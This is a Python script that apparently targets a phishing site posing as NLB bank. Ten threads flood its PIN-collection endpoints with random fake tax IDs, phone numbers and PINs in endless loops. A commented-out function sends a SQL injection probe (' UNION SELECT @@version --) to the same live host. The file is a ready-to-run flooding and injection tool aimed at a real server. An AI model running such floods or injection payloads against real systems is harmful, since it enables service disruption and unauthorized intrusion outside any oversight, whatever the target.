import sys, threading, random, requests, string
sys.dont_write_bytecode = True

MAIN_URL = "https://brt-pacco.20-19-37-230.cprapid.com/nlb/pin.php"
VERIFICATION_URL = "https://brt-pacco.20-19-37-230.cprapid.com/nlb/pin2.php"
SMS_CODE_URL = ""
HEADER: dict[str, str] = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}

def create_payload() -> dict[str, str]:
    return {
        "taxid": "".join([random.choice(string.digits) for i in range(9)]),
        "phonenumber": "".join([random.choice(string.digits) for i in range(9)])
    }

def spammer() -> None:
    while True:
        #try:
            with requests.Session() as session:
                req: requests.Response = session.post(MAIN_URL, headers=HEADER, json=create_payload(), allow_redirects=True)
                
                if req.status_code == 200:
                    verification: requests.Response = session.post(VERIFICATION_URL, headers=HEADER, json={"pincode": "".join([random.choice(string.digits) for i in range(4)])}, allow_redirects=True)

                    if verification.status_code == 200 and verification.url == "https://www.nlb.si/en":# and verification.url == SMS_CODE_URL
                        #sms_code: requests.Response = session.post(SMS_CODE_URL, headers=HEADER, json={"pincode": "".join([random.choice(string.digits) for i in range(4)])})
                        print("Request complete")
                        
                    else:
                        print(f"Verification failed with error code: {verification.status_code} > {verification.url}")

                else:
                    print(f"Main failed with error code: {req.status_code}")
        #except: pass

def main() -> None:
    threads: list[threading.Thread] = []
    for i in range(10):
        threads.append(threading.Thread(target=spammer))

    for thread in threads:
        thread.start()

def create_single_request():
    with requests.Session() as session:
        req = session.post(MAIN_URL, headers=HEADER, json={"taxid": "' UNION SELECT @@version --", "phonenumber": "123456789"})
        print(req.status_code)
        print(req.reason)

if __name__ == "__main__":
    #create_single_request()
    main()
